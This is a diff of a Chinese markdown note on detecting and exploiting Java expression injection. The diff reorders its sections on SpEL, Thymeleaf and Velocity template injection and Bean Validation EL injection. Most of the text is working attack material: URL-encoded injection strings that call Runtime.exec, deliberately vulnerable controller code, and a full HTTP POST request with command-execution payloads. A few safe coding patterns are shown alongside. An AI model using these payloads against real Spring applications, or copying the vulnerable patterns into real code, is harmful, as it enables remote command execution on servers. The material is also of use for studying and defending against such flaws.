@@ -1,4 +1,4 @@
-# SpEL表达式注入
+# Java表达式漏洞检测与利用
 # SpEL简介
 在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。
 ## SpEL定界符
@@ -77,142 +77,7 @@ SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个Evaluat
 
 SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。
 由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。
-## Thymeleaf模板注入分析
-参考：https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
-```java
-//GET /path?lang=en HTTP/1.1
-//GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x
-@GetMapping("/path")
-public String path(@RequestParam String lang) {
-    return "user/" + lang + "/welcome"; //template path is tainted
-}
 
-// thymeleaf 在解析包含 :: 的模板名时，会将其作为表达式去进行执行
-//GET /fragment?section=main
-//GET /fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x
-@GetMapping("/fragment")
-public String fragment(@RequestParam String section) {
-    return "welcome :: " + section; //fragment is tainted
-}
-
-//如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析.
-// /doc/__$%7BT(java.lang.Runtime).getRuntime().exec("calc")%7D__::.x
-@GetMapping("/doc/{document}")
-public void getDocument(@PathVariable String document) {
-    log.info("Retrieving " + document);
-    //returns void, so view name is taken from URI
-}
-```
-正确使用方式：
-```java
-// 设置ResponseBody注解,如果设置ResponseBody，则不再调用模板解析
-@GetMapping("/safe/fragment")
-@ResponseBody
-public String safeFragment(@RequestParam String section) {
-    return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
-}
-
-//设置redirect重定向，如果名称以redirect:开头，则不再调用ThymeleafView解析，调用RedirectView去解析controller的返回值
-@GetMapping("/safe/redirect")
-public String redirect(@RequestParam String url) {
-    return "redirect:" + url; //FP as redirects are not resolved as expressions
-}
-
-//由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析
-@GetMapping("/safe/doc/{document}")
-public void getDocument(@PathVariable String document, HttpServletResponse response) {
-    log.info("Retrieving " + document); //FP
-}
-// 其他
-<div th:fragment="main">
-    <span th:text="'Hello, ' + ${message}"></span>
-    <a th:href="@{__${message}__}" th:title="${message}">
-</div>
-```
-## SSTI of Java velocity
-```java
-// /velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc.exe%22)
-@GetMapping("/velocity")
-public void velocity(String template) {
-    Velocity.init();
-    VelocityContext context = new VelocityContext();
-    context.put("author", "Elliot A.");
-    context.put("address", "217 E Broadway");
-    context.put("phone", "555-1337");
-    StringWriter swOut = new StringWriter();
-    Velocity.evaluate(context, swOut, "test", template);
-}
-```
-## ConstraintValidatorContext.buildConstraintViolationWithTemplate
-实体User类
-```java
-public class User implements Serializable {
-    @UserValidator
-    private String username;
-    private String password;
-    private String id;
-}
-```
-UserCheck类
-```java
-public class UserCheck implements ConstraintValidator<UserValidator, String> {
-    private static final Pattern mail_pattern = Pattern.compile("^\\s*\\w+(?:\\.{0,1}[\\w-]+)*@[a-zA-Z0-9]+(?:[-.][a-zA-Z0-9]+)*\\.[a-zA-Z]+\\s*$");
-    public boolean isValid(String mail, ConstraintValidatorContext constraintValidatorContext) {
-        if (StringUtils.isEmpty(mail))
-            return false;
-        Matcher m = mail_pattern.matcher(mail);
-        if (m.matches())
-            return true;
-        constraintValidatorContext.disableDefaultConstraintViolation();
-        //错误的将用户输入的信息带入构建模板中，导致SPEL表达式的注入。
-        constraintValidatorContext.buildConstraintViolationWithTemplate("mail not exist: " + mail).addConstraintViolation();
-        return false;
-    }
-
-    public void initialize(UserValidator constraintAnnotation) {}
-}
-```
-UserValidator类
-```java
-import javax.validation.Constraint;
-import javax.validation.Payload;
-import java.lang.annotation.ElementType;
-import java.lang.annotation.Retention;
-import java.lang.annotation.RetentionPolicy;
-import java.lang.annotation.Target;
-
-@Target({ElementType.METHOD, ElementType.FIELD, ElementType.ANNOTATION_TYPE, ElementType.CONSTRUCTOR, ElementType.PARAMETER})
-@Retention(RetentionPolicy.RUNTIME)
-@Constraint(validatedBy = {UserCheck.class})
-public @interface UserValidator {
-    String message() default "error user";
-
-    Class<?>[] groups() default {};
-
-    Class<? extends Payload>[] payload() default {};
-}
-```
-```java
-@PostMapping({"/signup"})
-public String signupPost(@Valid @ModelAttribute("user") User user, BindingResult bindingResult, Model model) {
-    if (bindingResult.hasErrors()) {
-        model.addAttribute("erroremail", Boolean.valueOf(true));
-        return "signup";
-    }
-    return "redirect:/";
-}
-```
-SPEL执行命令：
-```
-POST /valid/signup HTTP/1.1
-Host: www.test.com:8080
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 185
-
-username=${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}&password=123&id=121
-```
 # SPEL Payload
 ## 常见payload
 ```java
@@ -340,6 +205,144 @@ Student student = new Student();
 EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(student).build();
 Expression expression = parser.parseExpression(spel);
 System.out.println(expression.getValue(context));
+```
+# Thymeleaf模板注入分析
+参考：https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
+```java
+//GET /path?lang=en HTTP/1.1
+//GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x
+@GetMapping("/path")
+public String path(@RequestParam String lang) {
+    return "user/" + lang + "/welcome"; //template path is tainted
+}
+
+// thymeleaf 在解析包含 :: 的模板名时，会将其作为表达式去进行执行
+//GET /fragment?section=main
+//GET /fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x
+@GetMapping("/fragment")
+public String fragment(@RequestParam String section) {
+    return "welcome :: " + section; //fragment is tainted
+}
+
+//如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析.
+// /doc/__$%7BT(java.lang.Runtime).getRuntime().exec("calc")%7D__::.x
+@GetMapping("/doc/{document}")
+public void getDocument(@PathVariable String document) {
+    log.info("Retrieving " + document);
+    //returns void, so view name is taken from URI
+}
+```
+正确使用方式：
+```java
+// 设置ResponseBody注解,如果设置ResponseBody，则不再调用模板解析
+@GetMapping("/safe/fragment")
+@ResponseBody
+public String safeFragment(@RequestParam String section) {
+    return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
+}
+
+//设置redirect重定向，如果名称以redirect:开头，则不再调用ThymeleafView解析，调用RedirectView去解析controller的返回值
+@GetMapping("/safe/redirect")
+public String redirect(@RequestParam String url) {
+    return "redirect:" + url; //FP as redirects are not resolved as expressions
+}
+
+//由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析
+@GetMapping("/safe/doc/{document}")
+public void getDocument(@PathVariable String document, HttpServletResponse response) {
+    log.info("Retrieving " + document); //FP
+}
+// 其他
+<div th:fragment="main">
+    <span th:text="'Hello, ' + ${message}"></span>
+    <a th:href="@{__${message}__}" th:title="${message}">
+</div>
+```
+# SSTI of Java velocity
+```java
+// /velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc.exe%22)
+@GetMapping("/velocity")
+public void velocity(String template) {
+    Velocity.init();
+    VelocityContext context = new VelocityContext();
+    context.put("author", "Elliot A.");
+    context.put("address", "217 E Broadway");
+    context.put("phone", "555-1337");
+    StringWriter swOut = new StringWriter();
+    Velocity.evaluate(context, swOut, "test", template);
+}
+```
+# ConstraintValidatorContext.buildConstraintViolationWithTemplate
+实体User类
+```java
+public class User implements Serializable {
+    @UserValidator
+    private String username;
+    private String password;
+    private String id;
+}
+```
+UserCheck类
+```java
+public class UserCheck implements ConstraintValidator<UserValidator, String> {
+    private static final Pattern mail_pattern = Pattern.compile("^\\s*\\w+(?:\\.{0,1}[\\w-]+)*@[a-zA-Z0-9]+(?:[-.][a-zA-Z0-9]+)*\\.[a-zA-Z]+\\s*$");
+    public boolean isValid(String mail, ConstraintValidatorContext constraintValidatorContext) {
+        if (StringUtils.isEmpty(mail))
+            return false;
+        Matcher m = mail_pattern.matcher(mail);
+        if (m.matches())
+            return true;
+        constraintValidatorContext.disableDefaultConstraintViolation();
+        //错误的将用户输入的信息带入构建模板中，导致EL表达式的注入。
+        constraintValidatorContext.buildConstraintViolationWithTemplate("mail not exist: " + mail).addConstraintViolation();
+        return false;
+    }
+
+    public void initialize(UserValidator constraintAnnotation) {}
+}
+```
+UserValidator类
+```java
+import javax.validation.Constraint;
+import javax.validation.Payload;
+import java.lang.annotation.ElementType;
+import java.lang.annotation.Retention;
+import java.lang.annotation.RetentionPolicy;
+import java.lang.annotation.Target;
+
+@Target({ElementType.METHOD, ElementType.FIELD, ElementType.ANNOTATION_TYPE, ElementType.CONSTRUCTOR, ElementType.PARAMETER})
+@Retention(RetentionPolicy.RUNTIME)
+@Constraint(validatedBy = {UserCheck.class})
+public @interface UserValidator {
+    String message() default "error user";
+
+    Class<?>[] groups() default {};
+
+    Class<? extends Payload>[] payload() default {};
+}
+```
+```java
+@PostMapping({"/signup"})
+public String signupPost(@Valid @ModelAttribute("user") User user, BindingResult bindingResult, Model model) {
+    if (bindingResult.hasErrors()) {
+        model.addAttribute("erroremail", Boolean.valueOf(true));
+        return "signup";
+    }
+    return "redirect:/";
+}
+```
+执行命令：
+```
+POST /valid/signup HTTP/1.1
+Host: www.test.com:8080
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 185
+
+username=${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}&password=123&id=121
+或者
+username=${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null), 'calc')}&password=123&id=12166666
 ```
 # 参考
 http://rui0.cn/archives/1043<br>
